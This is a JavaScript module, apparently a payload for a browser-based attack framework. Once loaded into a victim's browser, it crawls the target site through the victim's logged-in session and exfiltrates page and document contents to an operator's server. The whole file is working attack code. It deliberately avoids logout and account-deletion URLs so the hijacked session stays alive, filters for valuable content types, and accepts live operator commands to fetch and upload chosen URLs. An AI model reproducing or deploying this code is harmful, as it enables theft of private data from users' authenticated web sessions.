const MAX_DEPTH = 3;
const MAX_PAGES = 100;

/**
 * Default per-client exfiltration config. Overridden by the config object passed to init().
 * `seed` — when non-empty, the spider crawls from this URL instead of the iframe origin.
 */
let _config = { exfiltrate: false, limitTypes: true, maxFileSize: 10 * 1024 * 1024, seed: "" };

let _send = null;
let _sendBinary = null;
let _log = null;
let _iframe = null;
let _baseOrigin = null;
let visited = new Set();
let queue = [];
let crawling = false;
let stopped = false;
let crawledCount = 0;

/**
 * URL path/query patterns that commonly trigger session termination.
 * Any URL whose path or query string matches is silently skipped by the crawler.
 * Covers the most common logout, sign-out, session-kill, and account-deletion endpoints.
 */
const SESSION_KILL_RE = new RegExp(
  [
    "log[-_]?out",        // logout, log-out, log_out
    "log[-_]?off",        // logoff, log-off, log_off
    "sign[-_]?out",       // signout, sign-out, sign_out
    "sign[-_]?off",       // signoff, sign-off, sign_off
    "sign[-_]?in[-_]?out",// sign-in-out (some frameworks)
    "end[-_]?session",    // end-session, end_session
    "close[-_]?session",  // close-session, close_session
    "kill[-_]?session",   // kill-session, kill_session
    "revoke[-_]?session", // revoke-session
    "invalidate",         // invalidate, invalidate-session
    "delete[-_]?account", // delete-account, delete_account
    "close[-_]?account",  // close-account, close_account
    "remove[-_]?account", // remove-account
    "deactivate",         // deactivate (account / session)
    "disconnect",         // disconnect
    "expire[-_]?session", // expire-session
  ].join("|"),
  "i"
);

/**
 * Returns true if the URL path or query string matches a known session-terminating pattern.
 * @param {string} url
 * @returns {boolean}
 */
function isSessionKillUrl(url) {
  try {
    const { pathname, search } = new URL(url);
    return SESSION_KILL_RE.test(pathname + search);
  } catch (_) {
    return false;
  }
}

/**
 * Content types that should never be exfiltrated (media/binary assets with no text value).
 * CSS is excluded separately because it's large and of limited forensic value.
 */
const SKIP_TYPES = /^(image|font|audio|video)\//;

/**
 * Content types considered "useful" when limitTypes is true.
 * Matches HTML, plain text, JSON, JavaScript, XML, CSV, PDF, and Office document types.
 */
const USEFUL_TYPES = /^(text\/html|text\/plain|text\/xml|text\/javascript|text\/csv|application\/json|application\/javascript|application\/xml|application\/xhtml|application\/pdf|application\/msword|application\/vnd\.)/;

/**
 * Determines whether a fetched resource should be exfiltrated based on config, content type,
 * and size constraints.
 * @param {string} contentType - The response Content-Type header value
 * @param {number} size - Response body size in bytes
 * @returns {boolean}
 */
function shouldExfiltrate(contentType, size) {
  if (!_config.exfiltrate) return false;
  if (size > _config.maxFileSize) return false;
  const ct = (contentType || '').toLowerCase().split(';')[0].trim();
  if (SKIP_TYPES.test(ct)) return false;
  if (ct === 'text/css') return false;
  return _config.limitTypes ? USEFUL_TYPES.test(ct) : true;
}

/**
 * Builds and sends a binary frame containing page content to the server.
 * Binary frame data format (packed into the spider binary frame's data portion):
 *   [4 bytes: JSON metadata length, big-endian uint32]
 *   [N bytes: JSON { url, contentType }]
 *   [rest: raw content bytes]
 * @param {string} url - The URL of the fetched resource
 * @param {string} contentType - Normalised content type (no params)
 * @param {Uint8Array} bytes - Raw response body bytes
 */
function uploadContent(url, contentType, bytes) {
  const meta = JSON.stringify({ url, contentType: contentType.split(';')[0].trim() });
  const metaBytes = new TextEncoder().encode(meta);
  const frame = new Uint8Array(4 + metaBytes.byteLength + bytes.byteLength);
  new DataView(frame.buffer).setUint32(0, metaBytes.byteLength, false);
  frame.set(metaBytes, 4);
  frame.set(bytes, 4 + metaBytes.byteLength);
  _sendBinary(frame);
}

function normalizeUrl(url) {
  try {
    const u = new URL(url);
    u.hash = "";
    return u.href;
  } catch (_) {
    return null;
  }
}

function isSameOrigin(url) {
  try {
    return new URL(url).origin === _baseOrigin;
  } catch (_) {
    return false;
  }
}

/**
 * Parses an HTML string and extracts all same-origin links, including:
 *   - <a href> — navigation links
 *   - <script src> — JavaScript files
 *   - <link href> (non-stylesheet) — other linked resources
 *   - <form action> — form submission endpoints
 *   - <iframe src> — embedded page references
 * @param {string} html
 * @param {string} baseUrl
 * @returns {string[]} Normalised, same-origin URLs
 */
function extractLinks(html, baseUrl) {
  const links = [];
  try {
    const doc = new DOMParser().parseFromString(html, "text/html");

    // <a href>
    for (const a of doc.querySelectorAll("a[href]")) {
      try {
        const resolved = new URL(a.getAttribute("href"), baseUrl).href;
        const normalized = normalizeUrl(resolved);
        if (normalized && isSameOrigin(normalized)) links.push(normalized);
      } catch (_) {}
    }

    // <script src>
    for (const s of doc.querySelectorAll("script[src]")) {
      try {
        const resolved = new URL(s.getAttribute("src"), baseUrl).href;
        const normalized = normalizeUrl(resolved);
        if (normalized && isSameOrigin(normalized)) links.push(normalized);
      } catch (_) {}
    }

    // <link href> — skip stylesheets
    for (const l of doc.querySelectorAll("link[href]")) {
      if ((l.getAttribute("rel") || "").includes("stylesheet")) continue;
      try {
        const resolved = new URL(l.getAttribute("href"), baseUrl).href;
        const normalized = normalizeUrl(resolved);
        if (normalized && isSameOrigin(normalized)) links.push(normalized);
      } catch (_) {}
    }

    // <form action>
    for (const f of doc.querySelectorAll("form[action]")) {
      try {
        const resolved = new URL(f.getAttribute("action"), baseUrl).href;
        const normalized = normalizeUrl(resolved);
        if (normalized && isSameOrigin(normalized)) links.push(normalized);
      } catch (_) {}
    }

    // <iframe src>
    for (const fr of doc.querySelectorAll("iframe[src]")) {
      try {
        const resolved = new URL(fr.getAttribute("src"), baseUrl).href;
        const normalized = normalizeUrl(resolved);
        if (normalized && isSameOrigin(normalized)) links.push(normalized);
      } catch (_) {}
    }
  } catch (_) {}
  return links;
}

function sendStatus() {
  if (!_send) return;
  _send("status", {
    discovered: visited.size,
    crawled: crawledCount,
    queued: queue.length,
  });
}

/**
 * Main crawl loop. Fetches pages from the queue, records results, optionally exfiltrates content,
 * and enqueues new links found in HTML responses.
 */
async function processQueue() {
  if (crawling || stopped) return;
  crawling = true;

  while (queue.length > 0 && !stopped && crawledCount < MAX_PAGES) {
    const { url, depth } = queue.shift();

    try {
      const res = await fetch(url);
      if (!res.ok) continue;

      const contentType = res.headers.get("content-type") || "";
      const bytes = new Uint8Array(await res.arrayBuffer());
      const size = bytes.byteLength;
      crawledCount++;

      _send("result", { url, status: res.status, depth, contentType, size, discoveredAt: Date.now() });
      sendStatus();

      // Optionally exfiltrate the body based on config + content-type filters
      if (shouldExfiltrate(contentType, size)) {
        uploadContent(url, contentType, bytes);
      }

      // Only extract links from HTML responses, and only within depth limit
      if (contentType.includes("text/html") && depth < MAX_DEPTH) {
        const html = new TextDecoder().decode(bytes);
        const links = extractLinks(html, url);
        for (const link of links) {
          if (!visited.has(link) && !isSessionKillUrl(link) && crawledCount + queue.length < MAX_PAGES) {
            visited.add(link);
            queue.push({ url: link, depth: depth + 1 });
          }
        }
        sendStatus();
      }
    } catch (err) {
      if (_log) _log("warn", `Fetch failed for ${url}: ${err.message}`);
    }
  }

  crawling = false;

  if (queue.length === 0 || crawledCount >= MAX_PAGES) {
    if (_log) _log("info", `Crawl complete: ${visited.size} discovered, ${crawledCount} crawled`);
    _send("done", { discovered: visited.size, crawled: crawledCount });
  }
}

/**
 * Enqueues seed URLs that are same-origin and not yet visited, then kicks off processQueue().
 * Deduplicates against `visited`; adds each URL at depth 0.
 * @param {string[]} seeds - Absolute URLs to use as crawl entry points.
 */
function crawl(seeds) {
  let enqueued = 0;
  for (const seedUrl of seeds) {
    const normalized = normalizeUrl(seedUrl);
    if (!normalized || !isSameOrigin(normalized)) continue;
    if (isSessionKillUrl(normalized)) {
      if (_log) _log("warn", `Skipping session-kill URL: ${normalized}`);
      continue;
    }
    if (!visited.has(normalized)) {
      visited.add(normalized);
      queue.push({ url: normalized, depth: 0 });
      enqueued++;
    }
  }
  if (_log) _log("info", `Crawl seeded: ${enqueued} new URL(s) queued (${seeds.length} provided)`);
  sendStatus();
  processQueue();
}

/**
 * Extracts links from the current iframe document and feeds them into crawl().
 * The current page URL is recorded as a depth-0 result before crawling begins.
 */
function seedFromIframe() {
  let frameDoc;
  try {
    frameDoc = _iframe.contentDocument;
  } catch (_) {
    return;
  }
  if (!frameDoc) return;

  // Record the current page as a depth-0 result before crawling its links
  try {
    const pageUrl = normalizeUrl(_iframe.contentWindow.location.href);
    if (pageUrl && !visited.has(pageUrl)) {
      visited.add(pageUrl);
      _send("result", { url: pageUrl, status: 200, depth: 0, contentType: '', size: 0, discoveredAt: Date.now() });
    }
  } catch (_) {}

  const links = [];
  const baseHref = _iframe.contentWindow.location.href;
  const anchors = frameDoc.querySelectorAll("a[href]");
  for (const a of anchors) {
    try {
      const resolved = new URL(a.getAttribute("href"), baseHref).href;
      const normalized = normalizeUrl(resolved);
      if (normalized && isSameOrigin(normalized)) links.push(normalized);
    } catch (_) {}
  }

  crawl(links);
}

/**
 * Called each time the iframe finishes loading.
 * Uses the configured seed URL if set, otherwise extracts links from the iframe document.
 */
function onIframeLoad() {
  if (stopped) return;
  if (_config.seed) {
    if (_log) _log("info", `Seeding from configured URL: ${_config.seed}`);
    crawl([_config.seed]);
  } else {
    if (_log) _log("info", "Seeding links from iframe");
    seedFromIframe();
  }
}

/**
 * Payload entry point. Called by the loader with the API context after the bundle is executed.
 * @param {object} params
 * @param {HTMLIFrameElement} params.iframe - The loader's iframe element
 * @param {Function} params.send - Send a text payload message to the server
 * @param {Function} params.on - Register a handler for server-dispatched messages
 * @param {Function} params.log - Send a diagnostic log message to the server
 * @param {string} params.baseUrl - The target origin URL
 * @param {object} [params.config] - Per-payload config from the load message
 */
export function init({ iframe, send, sendBinary, on, log, baseUrl, config }) {
  _send = send;
  _sendBinary = sendBinary;
  _log = log;
  _iframe = iframe;

  if (_log) _log("info", "Spider payload initialized");
  try {
    _baseOrigin = new URL(baseUrl).origin;
  } catch (_) {
    _baseOrigin = location.origin;
  }

  // Apply initial config from the load message
  if (config && typeof config === "object") {
    Object.assign(_config, config);
  }

  // Handle live config updates pushed by the server (e.g. operator toggles exfiltrate in the UI)
  on("config", (data) => {
    Object.assign(_config, data);
  });

  // Manual exfiltration: operator selects specific URLs to fetch and upload
  on("exfiltrate", async (data) => {
    const urls = Array.isArray(data.urls) ? data.urls : [];
    if (urls.length === 0) return;
    if (_log) _log("info", `Exfiltrate: ${urls.length} URL(s) queued`);
    for (const url of urls) {
      if (_log) _log("info", `Fetching: ${url}`);
      _send("exfiltrate-progress", { url, status: "fetching" });
      try {
        const res = await fetch(url);
        const ct = res.headers.get("content-type") || "";
        const bytes = new Uint8Array(await res.arrayBuffer());
        uploadContent(url, ct, bytes);
        if (_log) _log("info", `Fetched: ${url} (${bytes.byteLength} B)`);
        _send("exfiltrate-progress", { url, status: "done", size: bytes.byteLength });
      } catch (err) {
        if (_log) _log("warn", `Fetch failed: ${url} — ${err.message}`);
        _send("exfiltrate-progress", { url, status: "error", error: err.message });
      }
    }
  });

  // Re-crawl: operator sends a list of seed URLs to crawl from (e.g. a directory node)
  on("crawl", (data) => {
    const seeds = Array.isArray(data.seeds) ? data.seeds : [];
    if (seeds.length === 0) return;
    if (_log) _log("info", `Re-crawl: ${seeds.length} seed URL(s)`);
    crawl(seeds);
  });

  on("stop", () => {
    stopped = true;
  });

  _iframe.addEventListener("load", onIframeLoad);

  // If iframe already loaded, seed now using the same logic as onIframeLoad
  try {
    if (_iframe.contentDocument && _iframe.contentDocument.readyState === "complete") {
      onIframeLoad();
    }
  } catch (_) {}
}

/** Clean up all state when the payload is unloaded by the loader. */
export function destroy() {
  stopped = true;
  if (_iframe) {
    _iframe.removeEventListener("load", onIframeLoad);
  }
  visited.clear();
  queue = [];
  crawledCount = 0;
  crawling = false;
  stopped = false;
  _send = null;
  _sendBinary = null;
  _log = null;
  _iframe = null;
  _baseOrigin = null;
  _config = { exfiltrate: false, limitTypes: true, maxFileSize: 10 * 1024 * 1024, seed: "" };
}
